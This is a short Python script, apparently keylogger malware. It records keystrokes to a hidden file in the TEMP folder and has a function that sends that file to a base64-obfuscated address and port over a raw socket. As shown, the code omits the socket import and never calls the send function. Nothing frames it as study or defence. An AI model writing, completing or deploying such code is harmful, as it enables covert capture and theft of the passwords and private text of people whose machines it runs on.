import sys
import os
from base64 import b64decode
from pynput import keyboard as kb
def log_key(k):
    with open(os.getenv('TEMP') + '\\k.dat', 'ab') as f:
        f.write(str(k).encode() + b'\n')
    print(f'Key {k} pressed')
def transmit_logs():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = b64decode('MTkyLjE2OC4xMjIuMTgy').decode()
    port = int(b64decode('OTAwMA=='))
    s.connect((addr, port))
    with open(os.getenv('TEMP') + '\\k.dat', 'rb') as f:
        data = f.read()
        s.sendall(data)
    s.close()
lstnr = kb.Listener(on_press=log_key)
lstnr.start()
sys.exit(lstnr.join())